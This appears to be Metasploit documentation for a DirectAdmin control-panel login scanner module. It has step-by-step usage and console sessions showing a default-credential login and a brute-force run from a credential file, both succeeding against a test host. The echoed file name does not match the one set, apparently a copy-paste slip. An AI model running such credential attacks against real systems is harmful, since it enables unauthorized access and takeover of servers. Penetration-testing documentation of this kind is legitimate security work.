## Description

This module attempts to log into DirectAdmin Web Control Panel. DirectAdmin Web Control Panel is commercial application for remote administration of Web server's. Gaining privileged access to DirectAdmin can lead to remote code execution via their upload utility, or sensitive information disclosure such as access to database backups.

## Vulnerable Application

[DirectAdmin Website](https://www.directadmin.com/)
[Demo Information]( https://www.directadmin.com/demo.php)

## Verification Steps

1. Do: ```use auxiliary/scanner/http/directadmin_login```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: Set credentials
5. Do: ```run```
6. You should see the module attempting to log in.

## Scenarios

### Attempt to login with the default credentials.

```
msf > use auxiliary/scanner/http/directadmin_login
msf auxiliary(scanner/http/directadmin_login) > set RHOSTS 10.0.0.39
RHOSTS => 10.0.0.39
msf auxiliary(scanner/http/directadmin_login) > set username demo_admin
username => demo_admin
msf auxiliary(scanner/http/directadmin_login) > set password demo
password => demo
msf auxiliary(scanner/http/directadmin_login) > run

[+] 10.0.0.39:2222 - Success: 'demo_admin:demo'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/directadmin_login) >
```

### Brute force with credentials from file.

```
msf > use auxiliary/scanner/http/directadmin_login 
msf auxiliary(directadmin_login) > set RHOSTS 10.0.0.39
RHOSTS => 10.0.0.39
msf auxiliary(directadmin_login) > set USERPASS_FILE ~/DirectAdminCreds.txt
USERPASS_FILE => ~/BuildMasterCreds.txt
msf auxiliary(directadmin_login) > run

[*] 10.0.0.39:81          - Trying username:"Admin" with password:"test"
[-] FAILED LOGIN - 10.0.0.39:81          - "Admin":"test"
[*] 10.0.0.39:81          - Trying username:"Admin" with password:"wrong"
[-] FAILED LOGIN - 10.0.0.39:81          - "Admin":"wrong"
[*] 10.0.0.39:81          - Trying username:"Admin" with password:"Admin"
[+] SUCCESSFUL LOGIN - 10.0.0.39:81          - "Admin":"Admin"
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(directadmin_login) > 
```
